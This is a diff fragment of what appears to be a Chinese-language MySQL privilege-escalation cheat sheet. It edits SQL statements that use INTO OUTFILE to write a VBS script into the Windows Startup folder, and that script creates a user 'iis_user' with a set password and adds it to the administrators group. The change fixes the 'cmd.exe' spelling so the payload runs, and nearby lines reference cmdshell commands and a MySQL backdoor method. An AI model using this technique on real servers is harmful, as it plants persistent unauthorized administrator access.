@@ -107,8 +107,8 @@ select cmdshell(’netstat -an’);
 二 VBS启动项提权 
 create table a (cmd text);  
 insert into a values ("set wshshell=createobject (""wscript.shell"") " );  
-insert into a values ("a=wshshell.run (""cmd。exe /c net user iis_user 123!@#abcABC/add"",0) " );  
-insert into a values ("b=wshshell.run (""cmd。exe /c net localgroup administrators iis_user /add"",0) " );  
+insert into a values ("a=wshshell.run (""cmd.exe /c net user iis_user 123!@#abcABC/add"",0) " );  
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators iis_user /add"",0) " );  
 select * from a into outfile "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.vbs"; 
 
 三 Linx MySQL BackDoor提权 
